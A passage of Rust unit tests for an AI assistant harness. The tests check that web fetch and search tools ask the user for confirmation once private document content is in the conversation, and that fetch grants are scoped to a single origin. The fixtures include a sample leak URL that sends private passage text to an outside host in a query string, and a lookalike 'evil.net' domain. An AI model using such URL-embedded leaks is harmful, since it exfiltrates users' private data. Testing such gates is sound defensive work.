            .must_confirm_in(&json!({"query": "private words"}), &ctx)
            .await
            .unwrap());

        // A document passage enters the run.
        let n = ctx.reserve_passages(1);
        ctx.record_passage(CitedPassage {
            n,
            file: "notes.pdf".into(),
            path: "C:/docs/notes.pdf".into(),
            page: Some("1".into()),
            web: false,
            text: "private words".into(),
            checkable: true,
        });
        assert!(fetch.must_confirm_in(&leak, &ctx).await.unwrap());
        let shown = fetch.preview_in(&leak, &ctx).await.unwrap();
        assert_eq!(
            shown.label.as_deref(),
            Some("Open https://x.example/?q=private")
        );
        assert_eq!(shown.details["url"], "https://x.example/?q=private");
        assert!(!fetch
            .must_confirm_in(&json!({"url": "https://example.com/article"}), &ctx)
            .await
            .unwrap());
        for tool in [&search as &dyn HostTool, &papers] {
            let query = json!({"query": "private words"});
            assert!(
                tool.must_confirm_in(&query, &ctx).await.unwrap(),
                "{}",
                tool.name()
            );
            assert_eq!(
                tool.preview_in(&query, &ctx).await.unwrap().details["query"],
                "private words"
            );
        }
    }

    #[tokio::test]
    async fn private_content_from_earlier_runs_or_the_message_still_asks() {
        use crate::harness::tools::{RunPassages, RunScope};
        let fetch = FetchUrlTool::new(env(None), web_client());
        let leak = json!({"url": "https://x.example/?q=private"});
        let session = Arc::new(RunPassages::new());
        let (tx, _rx) = mpsc::unbounded_channel();
        let first =
            ToolContext::new("run-1", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
        assert!(!fetch.must_confirm_in(&leak, &first).await.unwrap());
        first.record_opened("C:/docs/a.pdf", "private words");
        // The next run starts with no numbers, but the model still has them.
        session.reset();
        assert_eq!(session.issued(), 0);
        let second =
            ToolContext::new("run-2", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
        assert!(fetch.must_confirm_in(&leak, &second).await.unwrap());

        // A message carrying memories or history counts from its first call,
        // and a URL in it is only the user's when it is in their own words.
        let composed = ToolContext::new("run-3", "step-1", tx).with_scope(Arc::new(RunScope {
            private_context: true,
            question: Some("Earlier: https://x.example/?q=private".to_string()),
            ..RunScope::default()
        }));
        assert!(composed.private_content());
        assert_eq!(composed.user_words(), None);
        assert!(fetch.must_confirm_in(&leak, &composed).await.unwrap());
    }

    #[test]
    fn a_fetch_grant_names_exactly_one_origin() {
        assert_eq!(
            url_origin("https://Example.com/a?b=1").as_deref(),
            Some("https://example.com:443")
        );
        assert_eq!(
            url_origin("http://example.com:8080/x").as_deref(),
            Some("http://example.com:8080")
        );
        assert_eq!(url_origin("ftp://example.com/x"), None);
        assert_eq!(url_origin("not a url"), None);
        let fetch = FetchUrlTool::new(env(None), web_client());
        let grant = fetch
            .session_grant(&json!({"url": "https://example.com/article"}))
            .unwrap();
        assert_eq!(grant.key, "origin:https://example.com:443");
        assert_eq!(
            grant.label,
            "Allow https://example.com:443 for this conversation"
        );
        let other = fetch
            .session_grant(&json!({"url": "https://example.com.evil.net/"}))
            .unwrap();
        assert_ne!(other.key, grant.key);
        let search = WebSearchTool::new(env(None), web_client());
        let papers = SearchPapersTool::new(env(None), web_client());
        assert_ne!(
            search.session_grant(&json!({})).unwrap().key,
            papers.session_grant(&json!({})).unwrap().key
        );
    }

    #[test]
    fn a_pure_web_chat_does_not_arm_the_gate() {
        let (ctx, _rx) = ctx();
        let first = ctx.reserve_passages(2);
        for n in first..first + 2 {
            ctx.record_passage(CitedPassage {
                n,
                file: "Result".into(),
                path: format!("https://example.com/{n}"),
                page: None,
                web: true,
                text: "public".into(),
                checkable: true,
            });
        }
        assert!(!ctx.private_content());
        assert!(!fetch_needs_confirmation(
            "https://other.example/",
            ctx.private_content(),
            &ctx.web_sources(),
            None
        ));
    }
}
